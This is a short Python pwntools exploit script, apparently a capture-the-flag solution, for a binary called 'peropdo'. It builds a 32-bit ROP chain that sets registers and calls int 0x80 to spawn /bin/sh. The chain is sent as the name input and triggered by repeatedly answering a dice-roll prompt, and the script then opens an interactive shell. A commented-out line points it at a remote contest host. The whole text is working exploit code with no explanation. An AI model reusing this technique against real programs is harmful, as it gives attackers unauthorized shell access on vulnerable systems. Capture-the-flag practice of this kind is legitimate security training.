from pwn import *

p = process('./peropdo')
#p = remote("peropdo_bb53b90b35dba86353af36d3c6862621.quals.shallweplayaga.me",80)
call_count = 21442
rop_chain = '\x57\x16\x92\xc7'  # pop ebx
rop_chain += '/bin'  # pop esi
rop_chain += '/sh\x00'  # pop edi
rop_chain += 'CCCC'  # pop ebp

rop_chain += p32(0x80e3525) # pop eax
rop_chain += p32(0xe)       # eax
rop_chain += p32(0x8064823) # dec eax
rop_chain += p32(0x8064823) # dec eax
rop_chain += p32(0x8064823) # dec eax
rop_chain += p32(0x806f321) # pop ecx; pop ebx; ret
rop_chain += p32(0x0)       # ecx 
rop_chain += p32(0x80ecfc4) # ebx #/bin/sh
rop_chain += p32(0x806f2fa) # pop edx; ret
rop_chain += p32(0x0)       # edx
rop_chain += p32(0x806fadf) # int 80

p.sendlineafter('What is your name?\n', rop_chain)


def roll_dice(count, answer='y'):
    p.sendlineafter('like to roll?\n', str(count))
    p.sendlineafter('again? ', answer)

g = log.progress('Remain: ')
while call_count > 24: 
    roll_num = min(call_count-24, 24) 
    roll_dice(roll_num)
    call_count -= roll_num
    g.status(str(call_count))
g.success('Complete')

roll_dice(24, 'n')

p.interactive()
